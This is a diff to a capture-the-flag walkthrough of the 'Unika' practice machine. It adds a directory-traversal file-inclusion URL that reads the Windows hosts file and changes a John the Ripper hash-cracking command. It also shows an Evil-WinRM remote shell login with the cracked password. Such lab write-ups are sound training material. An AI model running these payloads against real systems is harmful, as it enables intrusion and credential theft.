@@ -16,7 +16,7 @@ This box demonstrates how a **File Inclusion vulnerability** can be abused to ca
 Performed an Nmap scan:
 
 ```bash
-nmap -sC -sV -Pn -p- 10.129.X.X
+nmap -p- --min-rate 1000 -sV 10.129.187.37
 ```
 
 ![nmap result](./writeup-images/nmap_result.png)
@@ -25,6 +25,10 @@ Discovered:
 - Port 80 (HTTP)
 - Possible web app hosted
 
+We add `unika.htb` to the `/etc/hosts` file so the browser can resolve it and send the correct `Host` header:
+```
+echo "10.129.187.37 unika.htb" | sudo tee -a /etc/hosts
+```
 Visited the site: **Unika**
 
 ![Unika site](./writeup-images/unika.png)
@@ -39,8 +43,8 @@ Found an input field that takes strings:
 
 Tested for LFI using:
 
-```http
-\\10.10.14.X\share
+```
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
 ![LFI string input](./writeup-images/lfi-string-input-result.png)
@@ -80,7 +84,7 @@ Saved the hash to a file: `hash.txt`
 Used `JohnTheRipper` with the rockyou wordlist:
 
 ```bash
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 Cracked password: **badminton**
@@ -94,7 +98,7 @@ Cracked password: **badminton**
 Logged in using Evil-WinRM:
 
 ```bash
-evil-winrm -i 10.129.X.X -u admin -p badminton
+evil-winrm -i 10.129.187.37 -u admin -p badminton
 ```
 
 ![Evil-WinRM shell](./writeup-images/Evil-Winrm.png)
@@ -113,7 +117,7 @@ type flag.txt
 
 ## 🔚 What I Learned  
 
-- How NTLMv2 works and why it's still dangerous when combined with LFI  
+- How NTLMv2 works and why it's still dangerous when combined with LFI (Local File Inclusion) 
 - Using `Responder` to capture hashes  
 - Cracking hashes with `john`  
 - Practical use of `Evil-WinRM` to get reverse shells on Windows targets  
@@ -124,9 +128,8 @@ type flag.txt
 - Nmap  
 - Responder  
 - JohnTheRipper  
-- Evil-WinRM  
-- Burp Suite  
-- Browser
+- Evil-WinRM    
+
 
 ---
 
@@ -136,5 +139,4 @@ Even though this was a Starting Point machine, the attack chain reflects a **rea
 
 ---
 
-**🔗 Connect with me on LinkedIn & check more writeups:**  
-[github.com/yourusername](https://github.com/yourusername)
+
